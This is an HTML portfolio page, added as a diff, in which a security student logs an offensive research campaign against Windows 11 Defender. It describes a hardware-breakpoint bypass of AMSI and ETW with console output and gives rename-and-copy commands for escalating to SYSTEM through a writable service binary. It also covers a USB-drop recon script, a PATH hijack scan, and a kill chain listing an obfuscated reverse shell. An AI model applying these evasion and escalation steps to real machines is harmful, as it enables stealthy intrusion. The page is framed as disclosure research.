@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>22DIV // george wu</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg: #0c0c0c;
+  --bg2: #111;
+  --bg3: #161616;
+  --green: #00ff41;
+  --green2: #00cc33;
+  --green3: #009922;
+  --amber: #ffb000;
+  --red: #ff4444;
+  --cyan: #00e5ff;
+  --dim: #555;
+  --muted: #888;
+  --text: #ccc;
+  --bright: #eee;
+  --mono: 'Cascadia Code', 'Consolas', 'Source Code Pro', 'Courier New', monospace;
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: var(--mono);
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.7;
+  min-height: 100vh;
+}
+
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,255,65,0.008) 3px, rgba(0,255,65,0.008) 4px);
+  pointer-events: none;
+  z-index: 999;
+}
+
+.container { max-width: 900px; margin: 0 auto; padding: 2rem 1.5rem; }
+
+/* ── HEADER ── */
+.header {
+  padding: 3rem 0 2rem;
+  border-bottom: 1px solid #1a1a1a;
+  margin-bottom: 3rem;
+}
+
+.header h1 {
+  font-size: 1.8rem;
+  color: var(--green);
+  font-weight: 400;
+  letter-spacing: 0.15em;
+  margin-bottom: 0.5rem;
+}
+
+.header .sub {
+  color: var(--muted);
+  font-size: 0.85rem;
+}
+
+.header .sub span { color: var(--dim); }
+
+/* ── PROMPT STYLING ── */
+.prompt {
+  color: var(--green2);
+  user-select: none;
+}
+
+.prompt::before {
+  content: 'vader@22div';
+  color: var(--green3);
+}
+
+.prompt::after {
+  content: ' $ ';
+  color: var(--dim);
+}
+
+/* ── TERMINAL BLOCK ── */
+.term {
+  background: var(--bg2);
+  border: 1px solid #1e1e1e;
+  border-radius: 6px;
+  padding: 1.2rem 1.5rem;
+  margin: 1.5rem 0;
+  overflow-x: auto;
+  font-size: 0.82rem;
+  line-height: 1.8;
+  position: relative;
+}
+
+.term::before {
+  content: attr(data-title);
+  position: absolute;
+  top: 0;
+  right: 0;
+  background: #1a1a1a;
+  color: var(--dim);
+  padding: 0.15rem 0.6rem;
+  font-size: 0.7rem;
+  border-radius: 0 6px 0 4px;
+}
+
+.term .cmd {
+  color: var(--bright);
+}
+
+.term .out {
+  color: var(--muted);
+}
+
+.term .out-green {
+  color: var(--green2);
+}
+
+.term .out-amber {
+  color: var(--amber);
+}
+
+.term .out-red {
+  color: var(--red);
+}
+
+.term .out-cyan {
+  color: var(--cyan);
+}
+
+.term .comment {
+  color: var(--dim);
+  font-style: italic;
+}
+
+/* ── JOURNAL ENTRIES ── */
+.entry {
+  margin-bottom: 3.5rem;
+  padding-bottom: 2rem;
+  border-bottom: 1px solid #141414;
+}
+
+.entry:last-child { border-bottom: none; }
+
+.entry-date {
+  color: var(--dim);
+  font-size: 0.75rem;
+  letter-spacing: 0.1em;
+  margin-bottom: 0.3rem;
+}
+
+.entry h2 {
+  color: var(--amber);
+  font-size: 1.1rem;
+  font-weight: 400;
+  margin-bottom: 1rem;
+}
+
+.entry p {
+  color: var(--text);
+  font-size: 0.85rem;
+  margin-bottom: 0.8rem;
+  max-width: 75ch;
+}
+
+.entry p strong {
+  color: var(--bright);
+  font-weight: 600;
+}
+
+.tag {
+  display: inline-block;
+  padding: 0.1rem 0.5rem;
+  font-size: 0.7rem;
+  border-radius: 3px;
+  margin-right: 0.3rem;
+  font-weight: 600;
+  letter-spacing: 0.05em;
+}
+
+.tag-confirmed { background: #002200; color: var(--green); border: 1px solid #003300; }
+.tag-detected { background: #220000; color: var(--red); border: 1px solid #330000; }
+.tag-msrc { background: #1a1400; color: var(--amber); border: 1px solid #2a2000; }
+.tag-built { background: #001a1a; color: var(--cyan); border: 1px solid #002a2a; }
+.tag-system { background: #001100; color: #00ff88; border: 1px solid #002200; }
+
+/* ── STATUS TABLE ── */
+.status-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1.5rem 0;
+  font-size: 0.8rem;
+}
+
+.status-table th {
+  text-align: left;
+  color: var(--dim);
+  font-weight: 400;
+  padding: 0.4rem 0.8rem;
+  border-bottom: 1px solid #1e1e1e;
+  letter-spacing: 0.05em;
+}
+
+.status-table td {
+  padding: 0.5rem 0.8rem;
+  border-bottom: 1px solid #111;
+  color: var(--muted);
+}
+
+.status-table tr:hover td { background: #0e0e0e; }
+
+/* ── NAV ── */
+nav {
+  position: sticky;
+  top: 0;
+  background: rgba(12,12,12,0.95);
+  backdrop-filter: blur(8px);
+  border-bottom: 1px solid #1a1a1a;
+  z-index: 100;
+  padding: 0.6rem 0;
+}
+
+nav .inner {
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
+  display: flex;
+  gap: 1.5rem;
+  align-items: center;
+  flex-wrap: wrap;
+}
+
+nav a {
+  color: var(--dim);
+  text-decoration: none;
+  font-size: 0.75rem;
+  letter-spacing: 0.08em;
+  transition: color 0.2s;
+}
+
+nav a:hover { color: var(--green); }
+nav .brand { color: var(--green3); font-weight: 600; }
+
+/* ── FOOTER ── */
+footer {
+  border-top: 1px solid #1a1a1a;
+  padding: 2rem 0;
+  text-align: center;
+  color: var(--dim);
+  font-size: 0.75rem;
+}
+
+footer a { color: var(--green3); text-decoration: none; }
+footer a:hover { color: var(--green); }
+
+/* ── RESPONSIVE ── */
+@media (max-width: 640px) {
+  .container { padding: 1rem; }
+  .term { padding: 0.8rem 1rem; font-size: 0.75rem; }
+  .header h1 { font-size: 1.4rem; }
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="inner">
+    <a href="#top" class="brand">22DIV</a>
+    <a href="#about">about</a>
+    <a href="#darkroom">dark room</a>
+    <a href="#privesc">privesc</a>
+    <a href="#recon">recon</a>
+    <a href="#status">status</a>
+  </div>
+</nav>
+
+<div class="container" id="top">
+
+<!-- ═══════ HEADER ═══════ -->
+<div class="header">
+  <h1>22DIV // george wu</h1>
+  <div class="sub">
+    security research <span>//</span> windows internals <span>//</span> responsible disclosure
+  </div>
+  <br>
+  <div class="sub">
+    CSEC student. 29. Sydney. Everything here was built from first principles against
+    live defenses on my own hardware. Not downloaded. Not forked. Not copied from a
+    blog post. If it works, I know why. If it doesn't, I know why that too.
+  </div>
+</div>
+
+<!-- ═══════ ABOUT ═══════ -->
+<section class="entry" id="about">
+  <div class="entry-date">OPERATION VADER // 2026</div>
+  <h2>what this is</h2>
+
+  <p>
+    A modular offensive security research campaign against Windows 11 Home (Build 26200)
+    with full Defender Real-Time Protection enabled. Started as a TOCTOU race condition
+    study against Defender's quarantine pipeline. Six engagements. Thirty findings. The
+    deletion primitive was defeated by Microsoft's defense-in-depth. The wall held.
+  </p>
+  <p>
+    But the wall taught me how it was built. Every finding from that campaign feeds forward
+    into this toolkit. The architecture of how Defender checks, what it trusts, and where
+    the seams are.
+  </p>
+  <p>
+    <strong>Target environment:</strong> Windows 11 Home 24H2, standard user context,
+    Defender RTP enabled, tamper protection varies by machine. All testing on
+    personally-owned hardware. Household consent documented.
+  </p>
+
+  <div class="term" data-title="classification">
+<span class="out">CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY</span>
+<span class="out">OPERATOR:        VADER (george wu / 22DIV)</span>
+<span class="out">AUTHORISATION:   CSEC academic research, own hardware</span>
+<span class="out">DISCLOSURE:      Responsible disclosure via MSRC</span>
+<span class="out">FINDINGS:        46 (30 TOCTOU + 16 rootkit phase)</span>
+  </div>
+</section>
+
+<!-- ═══════ DARK ROOM ═══════ -->
+<section class="entry" id="darkroom">
+  <div class="entry-date">ENGAGEMENTS 7-9 // FINDINGS #31-#37</div>
+  <h2>the dark room</h2>
+
+  <p>
+    Defender has two user-mode telemetry gates: AMSI (script content scanning) and
+    ETW (process event tracing). Both can be bypassed. But HOW you bypass them matters.
+    The classic approach — VirtualProtect + patch bytes — gets caught immediately.
+    Defender has specific behavioral signatures for exactly this pattern.
+  </p>
+
+  <div class="term" data-title="engagement 7 // amsi classic patch">
+<span class="prompt"></span><span class="cmd">.\amsi_bypass.exe --patch</span>
+<span class="out-red">  [!] Process killed by Defender</span>
+<span class="out-red">  [!] Detection: Behavior:Win32/AMSI_Patch_T.B12</span>
+<span class="out-red">  [!] Binary quarantined retroactively (Trojan:Win32/Bearfoos.B!ml)</span>
+<span class="out"></span>
+<span class="comment">  # VirtualProtect on amsi.dll = instant behavioral detection.</span>
+<span class="comment">  # Defender watches for EXACTLY this: memory permission change</span>
+<span class="comment">  # on AMSI code region followed by write. Specific rule. Named rule.</span>
+<span class="comment">  # The binary survived static analysis (XOR-encoded strings) but</span>
+<span class="comment">  # the ACT of patching is what triggers the kill.</span>
+  </div>
+
+  <p>
+    So I stopped trying to patch memory. Instead: hardware breakpoints. CPU debug
+    registers (DR0-DR3) intercept function execution at the hardware level. No
+    VirtualProtect. No memory writes. Zero bytes modified in amsi.dll. Defender's
+    tamper protection monitors memory — not CPU registers.
+  </p>
+
+  <div class="term" data-title="engagement 7 // amsi hwbp bypass">
+<span class="prompt"></span><span class="cmd">.\amsi_bypass_hwbp.exe</span>
+<span class="out"></span>
+<span class="out">  Phase 1: amsi.dll loaded at 0x00007FFD6E8F0000</span>
+<span class="out">  Phase 1: AmsiScanBuffer at 0x00007FFD6E8F8160</span>
+<span class="out-green">  Phase 2: DR0 = 0x00007FFD6E8F8160 (execution breakpoint)</span>
+<span class="out-green">  Phase 2: DR7 = 0x00000401 (local DR0 enable, exec, 1-byte)</span>
+<span class="out-green">  Phase 2: VEH handler registered</span>
+<span class="out">  Phase 3: calling AmsiScanBuffer...</span>
+<span class="out-green">  Phase 3: result = 0x80070057 (E_INVALIDARG)</span>
+<span class="out-green">  Phase 3: AMSI BYPASSED -- function never executed</span>
+<span class="out"></span>
+<span class="out">  Defender detection:  NONE</span>
+<span class="out">  Binary quarantined:  NO</span>
+<span class="out">  Memory modified:     0 bytes</span>
+<span class="out">  VirtualProtect calls: 0</span>
+  </div>
+
+  <p>
+    Same technique applied to ETW. EtwEventWrite in ntdll — same hardware breakpoint
+    approach, same result. Dead man test confirmed: called EtwEventWrite with a garbage
+    handle (0xDEADBEEF). Normal execution would error. With the breakpoint active, it
+    returned STATUS_SUCCESS — proof the function body never ran.
+  </p>
+
+  <div class="term" data-title="engagement 9 // dark room operational">
+<span class="prompt"></span><span class="cmd">.\dark_room.exe</span>
+<span class="out"></span>
+<span class="out">  PHASE 1: LOCATE</span>
+<span class="out">    AmsiScanBuffer at 0x00007FFD6E8F8160</span>
+<span class="out">    EtwEventWrite  at 0x00007FFD917E0430</span>
+<span class="out"></span>
+<span class="out">  PHASE 2: ACTIVATE</span>
+<span class="out-green">    DR0 = AmsiScanBuffer (AMSI blind)     OK</span>
+<span class="out-green">    DR1 = EtwEventWrite  (ETW blind)      OK</span>
+<span class="out-green">    DR7 = 0x00000405 (dual exec BP)       OK</span>
+<span class="out-green">    VEH unified handler registered         OK</span>
+<span class="out"></span>
+<span class="out">  PHASE 3: VERIFY</span>
+<span class="out-green">    AMSI:  0x80070057  E_INVALIDARG       BLIND</span>
+<span class="out-green">    ETW:   0x00000000  STATUS_SUCCESS     BLIND</span>
+<span class="out"></span>
+<span class="out-green">  DARK ROOM OPERATIONAL</span>
+<span class="out">  All user-mode telemetry defeated.</span>
+<span class="out">  0 bytes modified. 0 VirtualProtect calls.</span>
+<span class="out">  Defender detection: NONE</span>
+  </div>
+
+  <p>
+    <span class="tag tag-confirmed">CONFIRMED</span>
+    <span class="tag tag-msrc">MSRC POTENTIAL</span>
+    <strong>Finding #36:</strong> Defender's tamper protection has a systemic blind spot.
+    It monitors memory integrity but not CPU debug register state. SetThreadContext
+    on your own thread is a standard API — there is no behavioral rule for it.
+    Two independent bypasses (AMSI, ETW) using the same architectural gap.
+  </p>
+</section>
+
+<!-- ═══════ PRIVESC ═══════ -->
+<section class="entry" id="privesc">
+  <div class="entry-date">ENGAGEMENT 10 // FINDINGS #38-#43</div>
+  <h2>standard user to SYSTEM</h2>
+
+  <p>
+    Automated service scanner enumerated 308 SYSTEM services. One flagged immediately:
+    Wondershare NativePushService. Runs as LocalSystem. Binary lives in a per-user
+    AppData directory. The directory AND the binary have <strong>BUILTIN\Users Full Control</strong>.
+    Any standard user on the machine can replace the exe.
+  </p>
+
+  <div class="term" data-title="engagement 10 // service discovery">
+<span class="prompt"></span><span class="cmd">powershell -ep bypass .\hunter.ps1 | findstr CRITICAL</span>
+<span class="out"></span>
+<span class="out-red">  [CRITICAL] NativePushService (LocalSystem, Auto)</span>
+<span class="out-red">    Binary: C:\Users\apacw\AppData\Local\Wondershare\...\WsNativePushService.exe</span>
+<span class="out-red">    Directory ACL: BUILTIN\Users:(OI)(CI)(F)  -- FULL CONTROL</span>
+<span class="out-red">    Binary ACL:    BUILTIN\Users:(I)(F)       -- FULL CONTROL (inherited)</span>
+<span class="out"></span>
+<span class="comment">  # A LocalSystem service with its binary writable by standard users.</span>
+<span class="comment">  # CWE-732: Incorrect Permission Assignment for Critical Resource.</span>
+<span class="comment">  # The irony: Wondershare hardened against DLL sideloading with an</span>
+<span class="comment">  # embedded manifest that locks all DLL loads to System32. They</span>
+<span class="comment">  # hardened the windows but left the front door open.</span>
+  </div>
+
+  <p>
+    First attempt was DLL sideloading — VERSION.dll proxy, six iterations of Defender
+    evasion (plaintext → XOR → lazy-init). The v6 stealth proxy evaded Defender's ML
+    completely. But the service never loaded it. Extracted the PE manifest: every
+    non-KnownDLL import is hardcoded to System32 via <code>&lt;file&gt;</code>
+    redirection. DLL search order is overridden.
+  </p>
+  <p>
+    So I went simpler. If you can't plant a DLL next to the exe, just replace the exe.
+    Windows allows renaming open/locked files. Renamed the running service binary, dropped
+    my replacement. Next restart: SCM loads our code as LocalSystem.
+  </p>
+
+  <div class="term" data-title="engagement 10 // binary replacement">
+<span class="comment">  # Step 1: rename the running service exe (standard user, no elevation)</span>
+<span class="prompt"></span><span class="cmd">ren "...\WsNativePushService.exe" "WsNativePushService_real.exe"</span>
+<span class="out-green">  Success.</span>
+<span class="out"></span>
+<span class="comment">  # Step 2: plant replacement</span>
+<span class="prompt"></span><span class="cmd">copy svc_replace.exe "...\WsNativePushService.exe"</span>
+<span class="out-green">  1 file(s) copied.</span>
+<span class="out"></span>
+<span class="comment">  # Step 3: service restarts (reboot or admin restart)</span>
+<span class="comment">  # Step 4: check proof-of-execution</span>
+<span class="prompt"></span><span class="cmd">type C:\Windows\Temp\ws_diag.log</span>
+<span class="out-green">  20260615_033636|SYSTEM|elev=1|pid=34776|BINARY_REPLACE</span>
+<span class="out">                   ^^^^^^ ^^^^^^</span>
+<span class="out-amber">                   NT AUTHORITY\SYSTEM. Full token. Elevated.</span>
+<span class="out-amber">                   No admin creds entered. No UAC prompt.</span>
+  </div>
+
+  <p>
+    <span class="tag tag-system">SYSTEM</span>
+    <span class="tag tag-confirmed">CONFIRMED</span>
+    <strong>Finding #42:</strong> Standard user to LocalSystem via service binary replacement.
+    CVSS 7.8 (High). CWE-732. The replacement binary launches the real service exe
+    for continuity — service keeps running, nobody notices. Attack complexity: LOW.
+    Privileges required: LOW (standard user). User interaction: NONE (auto-start on reboot).
+  </p>
+
+  <p>
+    <strong>Every defense layer tested:</strong> File ACL — broken. Directory ACL — broken.
+    UAC — not triggered (AppData, not Program Files). Code signing — SCM doesn't verify.
+    Manifest hardening — irrelevant (binary replaced, no DLL loading). Defender static —
+    clean (our binary is a legitimate service exe). Defender behavioral — clean.
+  </p>
+</section>
+
+<!-- ═══════ RECON ═══════ -->
+<section class="entry" id="recon">
+  <div class="entry-date">ENGAGEMENTS 11-12 // FINDINGS #44-#46</div>
+  <h2>reconnaissance and new vectors</h2>
+
+  <p>
+    Built a self-contained recon package for target profiling. 17 sections, runs as
+    standard user, outputs an organised log. Designed for USB drop when remote access
+    is unavailable.
+  </p>
+
+  <div class="term" data-title="engagement 11 // recon execution">
+<span class="prompt"></span><span class="cmd">powershell -ep bypass .\vader_recon.ps1</span>
+<span class="out"></span>
+<span class="out">  ================================================================</span>
+<span class="out">  VADER RECON -- 22DIV</span>
+<span class="out">  Target: TARGET-PC</span>
+<span class="out">  Date: 2026-06-15 04:25:22</span>
+<span class="out">  User: standard_user</span>
+<span class="out">  ================================================================</span>
+<span class="out"></span>
+<span class="out">  Scanning 310 privileged services...</span>
+<span class="out-red">  [CRITICAL] SVC_WRITABLE -- NativePushService (LocalSystem) EXE WRITABLE</span>
+<span class="out-amber">  [HIGH] SVC_IN_PROFILE -- NativePushService binary in user profile</span>
+<span class="out-amber">  [HIGH] UNQUOTED_PATH -- pgbouncer: unquoted path with spaces</span>
+<span class="out-amber">  [HIGH] RAT_RUNNING -- TeamViewer active (PID 81748)</span>
+<span class="out-cyan">  [MEDIUM] RTP_ACTIVE -- Real-Time Protection enabled</span>
+<span class="out"></span>
+<span class="out-green">  RECON COMPLETE -- 1169 lines written to RECON_TARGET-PC_20260615.log</span>
+  </div>
+
+  <p>
+    Automated vector scan discovered new privilege escalation paths. Two user-owned
+    directories present in the machine-level SYSTEM PATH. Any SYSTEM-level process that
+    searches PATH for an executable or DLL will traverse directories that a standard
+    user has full control over.
+  </p>
+
+  <div class="term" data-title="engagement 12 // path hijack discovery">
+<span class="prompt"></span><span class="cmd">python scan_path.py --system-path --check-writable</span>
+<span class="out"></span>
+<span class="out">  === MACHINE PATH (HKLM) ===</span>
+<span class="out">    [locked]   C:\Program Files\nodejs\</span>
+<span class="out">    [locked]   C:\ProgramData\chocolatey\bin</span>
+<span class="out">    [locked]   C:\Program Files\dotnet\</span>
+<span class="out-red">    [WRITABLE] C:\Users\user\.local\bin            &lt;-- CWE-427</span>
+<span class="out">    [locked]   C:\Program Files\Git\cmd</span>
+<span class="out-red">    [WRITABLE] C:\Users\user\AppData\Local\Muse Hub\lib  &lt;-- CWE-427</span>
+<span class="out">    [locked]   C:\Program Files\Microsoft SQL Server\...</span>
+<span class="out"></span>
+<span class="out-amber">  2 user-writable directories in machine-level SYSTEM PATH.</span>
+<span class="out-amber">  Associated services running as LocalSystem:</span>
+<span class="out-amber">    MuseAuthService  -- RUNNING (LocalSystem)</span>
+<span class="out-amber">    MuseHubUpdater   -- Stopped (LocalSystem)</span>
+<span class="out"></span>
+<span class="comment">  # CWE-427: Uncontrolled Search Path Element.</span>
+<span class="comment">  # Any SYSTEM process doing a PATH search for a DLL or EXE will find</span>
+<span class="comment">  # whatever we plant there. Scope is SYSTEMIC -- affects all services.</span>
+<span class="comment">  # Confirmation pending: Process Monitor capture needed to identify</span>
+<span class="comment">  # which SYSTEM processes actually search PATH for loadable binaries.</span>
+  </div>
+
+  <p>
+    <span class="tag tag-msrc">MSRC POTENTIAL</span>
+    <strong>Finding #45:</strong> User-writable directories in machine SYSTEM PATH (CWE-427).
+    If any first-party Windows service hits these paths during DLL search, that's a
+    Microsoft-actionable privilege escalation. Confirmation requires Process Monitor
+    capture — pending.
+  </p>
+</section>
+
+<!-- ═══════ STATUS ═══════ -->
+<section class="entry" id="status">
+  <div class="entry-date">CURRENT STATUS</div>
+  <h2>kill chain</h2>
+
+  <table class="status-table">
+    <thead>
+      <tr>
+        <th>phase</th>
+        <th>component</th>
+        <th>status</th>
+        <th>notes</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td style="color:var(--dim)">0</td>
+        <td>C2 infrastructure</td>
+        <td><span class="tag tag-built">BUILT</span></td>
+        <td style="color:var(--dim)">XOR-obfuscated reverse shell, automated listener</td>
+      </tr>
+      <tr>
+        <td style="color:var(--dim)">1</td>
+        <td>AMSI bypass</td>
+        <td><span class="tag tag-confirmed">CONFIRMED</span></td>
+        <td style="color:var(--dim)">Hardware breakpoints, 0 bytes modified</td>
+      </tr>
+      <tr>
+        <td style="color:var(--dim)">2</td>
+        <td>ETW bypass</td>
+        <td><span class="tag tag-confirmed">CONFIRMED</span></td>
+        <td style="color:var(--dim)">Hardware breakpoints, dead man test passed</td>
+      </tr>
+      <tr>
+        <td style="color:var(--dim)">1+2</td>
+        <td>Dark room</td>
+        <td><span class="tag tag-confirmed">OPERATIONAL</span></td>
+        <td style="color:var(--dim)">Dual HWBP, all user-mode telemetry blind</td>
+      </tr>
+      <tr>
+        <td style="color:var(--dim)">3</td>
+        <td>Privilege escalation</td>
+        <td><span class="tag tag-system">SYSTEM</span></td>
+        <td style="color:var(--dim)">CWE-732, standard user to LocalSystem confirmed</td>
+      </tr>
+      <tr>
+        <td style="color:var(--dim)">3+0</td>
+        <td>SYSTEM reverse shell</td>
+        <td><span class="tag tag-built">BUILT</span></td>
+        <td style="color:var(--dim)">Service replacement + C2 callback integrated</td>
+      </tr>
+      <tr>
+        <td style="color:var(--dim)">-</td>
+        <td>Recon package</td>
+        <td><span class="tag tag-built">TESTED</span></td>
+        <td style="color:var(--dim)">17-section USB-droppable reconnaissance</td>
+      </tr>
+      <tr>
+        <td style="color:var(--dim)">4</td>
+        <td>Process injection</td>
+        <td style="color:var(--dim)">NOT BUILT</td>
+        <td style="color:var(--dim)">-</td>
+      </tr>
+      <tr>
+        <td style="color:var(--dim)">5</td>
+        <td>Stager / dropper</td>
+        <td style="color:var(--dim)">NOT BUILT</td>
+        <td style="color:var(--dim)">-</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2 style="margin-top: 2.5rem;">defense analysis</h2>
+
+  <table class="status-table">
+    <thead>
+      <tr>
+        <th>defense layer</th>
+        <th>status</th>
+        <th>finding</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>AMSI tamper protection</td>
+        <td><span class="tag tag-confirmed" style="background:#002200">BYPASSED</span></td>
+        <td style="color:var(--dim)">#33 (HWBP)</td>
+      </tr>
+      <tr>
+        <td>ETW process telemetry</td>
+        <td><span class="tag tag-confirmed" style="background:#002200">BYPASSED</span></td>
+        <td style="color:var(--dim)">#35 (HWBP)</td>
+      </tr>
+      <tr>
+        <td>Defender static analysis</td>
+        <td><span class="tag tag-confirmed" style="background:#002200">DEFEATED</span></td>
+        <td style="color:var(--dim)">#32 (XOR)</td>
+      </tr>
+      <tr>
+        <td>Defender behavioral analysis</td>
+        <td><span class="tag tag-confirmed" style="background:#002200">DEFEATED</span></td>
+        <td style="color:var(--dim)">#33 (no VirtualProtect)</td>
+      </tr>
+      <tr>
+        <td>Service binary ACLs</td>
+        <td><span class="tag tag-detected">BROKEN</span></td>
+        <td style="color:var(--dim)">#42 (CWE-732)</td>
+      </tr>
+      <tr>
+        <td>Manifest DLL hardening</td>
+        <td><span class="tag tag-confirmed" style="background:#002200">BYPASSED</span></td>
+        <td style="color:var(--dim)">#42 (binary replace)</td>
+      </tr>
+      <tr>
+        <td>UAC elevation prompt</td>
+        <td style="color:var(--dim)">NOT TRIGGERED</td>
+        <td style="color:var(--dim)">#42 (AppData path)</td>
+      </tr>
+      <tr>
+        <td>Code signing (SCM)</td>
+        <td style="color:var(--dim)">NOT ENFORCED</td>
+        <td style="color:var(--dim)">#42</td>
+      </tr>
+      <tr>
+        <td>SYSTEM PATH integrity</td>
+        <td><span class="tag tag-detected">BROKEN</span></td>
+        <td style="color:var(--dim)">#45 (CWE-427)</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="term" data-title="the flag" style="margin-top: 2rem;">
+<span class="out-amber">  OBJECTIVE:</span>
+<span class="out">  Standard user -> SYSTEM-level privilege escalation</span>
+<span class="out">  via novel attack vector discovered through this research</span>
+<span class="out">  Reported via MSRC -> CVE assigned -> george wu credited</span>
+<span class="out"></span>
+<span class="out-green">  Phase 3 flag captured (third-party, CWE-732).</span>
+<span class="out-amber">  MSRC flag outstanding: need first-party Windows service,</span>
+<span class="out-amber">  or Finding #36 (Defender HWBP blind spot) as independent path.</span>
+<span class="out-amber">  Finding #45 (PATH hijack) pending Process Monitor confirmation.</span>
+  </div>
+
+  <p style="margin-top: 1.5rem; color: var(--dim); font-size: 0.8rem;">
+    46 findings across 12 engagements. Every technique built from scratch against live
+    defenses. The wall held where it was supposed to. The gaps are where it wasn't looking.
+  </p>
+</section>
+
+</div>
+
+<footer>
+  <div>george wu / 22DIV</div>
+  <div style="margin-top: 0.3rem;">
+    <a href="https://github.com/rainfantry">github</a>
+  </div>
+  <div style="margin-top: 0.5rem; color: #333;">CSEC // responsible disclosure via MSRC</div>
+</footer>
+
+</body>
+</html>
